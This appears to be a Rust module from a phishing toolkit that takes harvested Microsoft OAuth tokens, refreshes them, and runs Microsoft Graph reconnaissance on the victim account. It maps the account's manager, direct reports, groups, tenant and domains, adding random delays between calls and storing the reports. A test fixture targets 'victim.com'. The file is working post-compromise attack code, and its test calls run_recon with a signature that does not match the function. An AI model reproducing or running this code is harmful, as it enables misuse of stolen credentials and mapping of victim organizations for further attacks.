use crate::graph_client::{
    DirectReport, GraphClient, GraphGroup, GraphManager, GraphUser,
};
use crate::AppState;
use actix_web::{web, HttpResponse, Responder};
use anyhow::Context;
use chrono::Utc;
use rand::Rng;
use serde::{Deserialize, Serialize};

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ReconReport {
    pub target_user: GraphUser,
    pub manager: Option<GraphManager>,
    pub direct_reports: Vec<DirectReport>,
    pub groups: Vec<GraphGroup>,
    pub organization: OrganizationSummary,
    pub directory_summary: DirectorySummary,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct OrganizationSummary {
    pub tenant_name: Option<String>,
    pub verified_domains: Vec<String>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct DirectorySummary {
    pub total_users: Option<i64>,
}

async fn recon_jitter() {
    let ms = rand::thread_rng().gen_range(1000..=3000);
    tokio::time::sleep(std::time::Duration::from_millis(ms)).await;
}

/// Orchestrate Graph API calls to build a full recon report.
/// Sleeps 1-3s between each call for rate-limiting.
pub async fn run_recon(
    state: &AppState,
    client: &GraphClient,
    token_id: &str,
) -> anyhow::Result<ReconReport> {
    // Use retrieve_any_token which checks both vault and harvested tables
    let token = crate::retrieve_any_token(state, token_id)
        .await
        .context("Failed to retrieve token for recon")?;

    // Refresh the access token — it may be expired
    let access_token = crate::refresh_access_token(state, &token.refresh_token)
        .await
        .unwrap_or_else(|| token.access_token.clone());

    // 1. GET /me
    let me = client.get_me(&access_token).await?;
    recon_jitter().await;

    // 2. GET /users/{id}/manager
    let manager = client.get_user_manager(&access_token, "me").await.ok();
    recon_jitter().await;

    // 3. GET /users/{id}/directReports
    let direct_reports = client
        .get_direct_reports(&access_token, "me")
        .await
        .unwrap_or_default();
    recon_jitter().await;

    // 4. GET /users/{id}/memberOf
    let _member_of = client
        .get_user_groups(&access_token, "me")
        .await
        .unwrap_or_default();
    recon_jitter().await;

    // 5. GET /organization
    let org = client.get_organization(&access_token).await.ok();
    recon_jitter().await;

    // 6. GET /groups?$top=999
    let groups = client
        .get_all_groups(&access_token)
        .await
        .unwrap_or_default();
    recon_jitter().await;

    let report = ReconReport {
        target_user: me,
        manager,
        direct_reports,
        groups,
        organization: OrganizationSummary {
            tenant_name: org.as_ref().and_then(|o| o.displayName.clone()),
            verified_domains: org
                .as_ref()
                .map(|o| {
                    o.verified_domains
                        .as_ref()
                        .unwrap_or(&vec![])
                        .iter()
                        .map(|d| d.name.clone())
                        .collect()
                })
                .unwrap_or_default(),
        },
        directory_summary: DirectorySummary { total_users: None },
    };

    // Store report JSON
    let report_json = serde_json::to_string(&report).context("Failed to serialize report")?;
    let id = uuid::Uuid::new_v4().to_string();
    sqlx::query(
        "INSERT INTO recon_reports (id, token_id, report_json, created_at) VALUES (?, ?, ?, ?)",
    )
    .bind(&id)
    .bind(token_id)
    .bind(&report_json)
    .bind(Utc::now())
    .execute(&state.pool)
    .await
    .context("Failed to insert recon report")?;

    Ok(report)
}

// === HTTP Handlers ===

#[derive(Deserialize)]
pub struct ReconRunRequest {
    token_id: String,
}

pub async fn recon_run_handler(
    body: web::Json<ReconRunRequest>,
    audit_ctx: crate::audit::AuditContext,
    state: web::Data<AppState>,
) -> impl Responder {
    let client = GraphClient::new();
    let result = run_recon(state.get_ref(), &client, &body.token_id).await;

    let success = result.is_ok();
    let _ = crate::audit::insert_audit_log(
        &state.pool,
        "recon_run",
        None,
        Some(&body.token_id),
        None,
        Some(&audit_ctx.ip_address),
        Some(&audit_ctx.user_agent),
        Some(serde_json::json!({"success": success})),
        success,
    ).await;

    match result {
        Ok(report) => HttpResponse::Ok().json(report),
        Err(e) => {
            eprintln!("[recon] Run failed for {}: {}", body.token_id, e);
            HttpResponse::InternalServerError().json(serde_json::json!({
                "error": "recon_failed",
                "details": format!("{}", e)
            }))
        }
    }
}

pub async fn recon_get_handler(
    path: web::Path<String>,
    req: actix_web::HttpRequest,
    state: web::Data<AppState>,
) -> impl Responder {
    let token_id = path.into_inner();

    #[derive(sqlx::FromRow)]
    #[allow(dead_code)]
    struct ReportRow {
        report_json: String,
        created_at: chrono::DateTime<Utc>,
    }

    let row: Option<ReportRow> = sqlx::query_as(
        "SELECT report_json, created_at FROM recon_reports WHERE token_id = ? ORDER BY created_at DESC LIMIT 1"
    )
    .bind(&token_id)
    .fetch_optional(&state.pool)
    .await
    .unwrap_or(None);

    match row {
        Some(r) => {
            match serde_json::from_str::<ReconReport>(&r.report_json) {
                Ok(report) => {
                    let json = serde_json::to_value(report).unwrap_or_default();
                    crate::response_crypto::ResponseCrypto::respond(&req, json, &state.response_key)
                }
                Err(e) => HttpResponse::InternalServerError().json(serde_json::json!({
                    "error": "corrupted_report",
                    "details": format!("{}", e)
                })),
            }
        }
        None => HttpResponse::NotFound().json(serde_json::json!({
            "error": "no_report",
            "message": "No recon report found for this token"
        })),
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::AppConfig;
    use sqlx::sqlite::SqlitePoolOptions;
    use wiremock::matchers::{header, method, path, query_param};
    use wiremock::{Mock, MockServer, ResponseTemplate};

    async fn setup_test_state() -> AppState {
        let pool = SqlitePoolOptions::new()
            .max_connections(1)
            .connect("sqlite::memory:")
            .await
            .unwrap();

        sqlx::query(
            r#"
            CREATE TABLE tokens (
                id TEXT PRIMARY KEY,
                campaign_id TEXT,
                user_email TEXT,
                encrypted_access_token BLOB NOT NULL,
                encrypted_refresh_token BLOB NOT NULL,
                access_salt BLOB NOT NULL,
                refresh_salt BLOB NOT NULL,
                scopes TEXT,
                expires_at DATETIME NOT NULL,
                created_at DATETIME NOT NULL,
                last_refreshed_at DATETIME,
                status TEXT DEFAULT 'active',
                account_type TEXT,
                cookie_session TEXT
            )
            "#,
        )
        .execute(&pool)
        .await
        .unwrap();

        sqlx::query(
            r#"
            CREATE TABLE recon_reports (
                id TEXT PRIMARY KEY,
                token_id TEXT NOT NULL,
                report_json TEXT NOT NULL,
                created_at DATETIME NOT NULL
            )
            "#,
        )
        .execute(&pool)
        .await
        .unwrap();

        let config = AppConfig {
            client_id: "test_client_id".to_string(),
            client_secret: "test_secret".to_string(),
            redirect_uri: "http://localhost".to_string(),
            first_party_ids: vec![],
            database_url: "sqlite::memory:".to_string(),
            telegram_bot_token: None,
            telegram_chat_id: None,
            master_secret: "test_recon_secret".to_string(),
            frontend_url: None,
        };

        let vault = Vault::new(config.master_secret.clone());
        let http_client = reqwest::Client::new();

        let response_key = crate::response_crypto::ResponseCrypto::derive_key(&config.master_secret);

        AppState {
            pool,
            config,
            http_client,
            vault,
            response_key,
        }
    }

    #[tokio::test]
    async fn test_run_recon_and_retrieve() {
        let state = setup_test_state().await;
        let mock_server = MockServer::start().await;
        let client = GraphClient::with_base_url(&mock_server.uri());

        let token_id = state
            .vault
            .store_token(
                &state.pool,
                "camp_recon",
                "recon@victim.com",
                "access_123",
                "refresh_123",
                vec!["User.Read".to_string(), "Group.Read.All".to_string()],
                Utc::now() + chrono::Duration::hours(2),
                None,
            )
            .await
            .unwrap();

        // Mock /v1.0/me
        Mock::given(method("GET"))
            .and(path("/v1.0/me"))
            .and(header("Authorization", "Bearer access_123"))
            .respond_with(ResponseTemplate::new(200).set_body_json(serde_json::json!({
                "id": "user-recon-1",
                "displayName": "Recon User",
                "userPrincipalName": "recon@victim.com",
                "jobTitle": "Engineer"
            })))
            .mount(&mock_server)
            .await;

        // Mock /v1.0/me/manager
        Mock::given(method("GET"))
            .and(path("/v1.0/me/manager"))
            .respond_with(ResponseTemplate::new(200).set_body_json(serde_json::json!({
                "id": "manager-1",
                "displayName": "Boss Man",
                "userPrincipalName": "boss@victim.com"
            })))
            .mount(&mock_server)
            .await;

        // Mock /v1.0/me/directReports
        Mock::given(method("GET"))
            .and(path("/v1.0/me/directReports"))
            .respond_with(ResponseTemplate::new(200).set_body_json(serde_json::json!({
                "value": [
                    { "id": "dr-1", "displayName": "Minion One", "userPrincipalName": "minion1@victim.com" }
                ]
            })))
            .mount(&mock_server)
            .await;

        // Mock /v1.0/me/memberOf
        Mock::given(method("GET"))
            .and(path("/v1.0/me/memberOf"))
            .respond_with(ResponseTemplate::new(200).set_body_json(serde_json::json!({
                "value": [
                    { "id": "grp-1", "displayName": "Engineering" }
                ]
            })))
            .mount(&mock_server)
            .await;

        // Mock /v1.0/organization
        Mock::given(method("GET"))
            .and(path("/v1.0/organization"))
            .respond_with(ResponseTemplate::new(200).set_body_json(serde_json::json!({
                "value": [{
                    "id": "org-1",
                    "displayName": "Victim Corp",
                    "verifiedDomains": [
                        { "name": "victim.com", "isDefault": true }
                    ]
                }]
            })))
            .mount(&mock_server)
            .await;

        // Mock /v1.0/groups?$top=999
        Mock::given(method("GET"))
            .and(path("/v1.0/groups"))
            .and(query_param("$top", "999"))
            .respond_with(ResponseTemplate::new(200).set_body_json(serde_json::json!({
                "value": [
                    { "id": "grp-all-1", "displayName": "All Users" },
                    { "id": "grp-all-2", "displayName": "Finance" }
                ]
            })))
            .mount(&mock_server)
            .await;

        let report = run_recon(&state.pool, &state.vault, &client, &token_id)
            .await
            .expect("Recon should succeed");

        assert_eq!(report.target_user.id, "user-recon-1");
        assert_eq!(report.target_user.displayName, Some("Recon User".to_string()));
        assert!(report.manager.is_some());
        assert_eq!(report.manager.as_ref().unwrap().displayName, Some("Boss Man".to_string()));
        assert_eq!(report.direct_reports.len(), 1);
        assert_eq!(report.groups.len(), 2);
        assert_eq!(report.organization.tenant_name, Some("Victim Corp".to_string()));
        assert_eq!(report.organization.verified_domains, vec!["victim.com"]);

        // Verify stored in DB
        let row: (String,) = sqlx::query_as(
            "SELECT report_json FROM recon_reports WHERE token_id = ? ORDER BY created_at DESC LIMIT 1"
        )
        .bind(&token_id)
        .fetch_one(&state.pool)
        .await
        .unwrap();

        let stored: ReconReport = serde_json::from_str(&row.0).unwrap();
        assert_eq!(stored.target_user.id, "user-recon-1");
    }
}
